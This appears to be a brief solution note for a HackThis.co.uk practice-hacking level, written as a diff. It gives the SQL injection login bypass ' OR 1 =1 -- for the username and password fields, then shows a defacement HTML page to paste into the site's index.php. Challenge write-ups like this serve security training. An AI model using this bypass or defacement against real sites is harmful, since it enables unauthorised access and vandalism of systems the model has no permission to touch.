@@ -1,0 +1,23 @@
+https://www.hackthis.co.uk/levels/extras/real/xmas/mod.php
+in username and password:
+' OR 1 =1 --
+
+paste
+<html>
+<head>
+<title>WARNING!!</title>
+<style type="text/css">
+body{
+        background-color: #000000;
+        color: #FFFFFF;
+}
+</style>
+</head>
+<body>
+<div style="width: 100%; text-align:center">
+        <img src="xmaswarning.jpg" />
+
+</div>
+</body>
+</html>
+into index.php
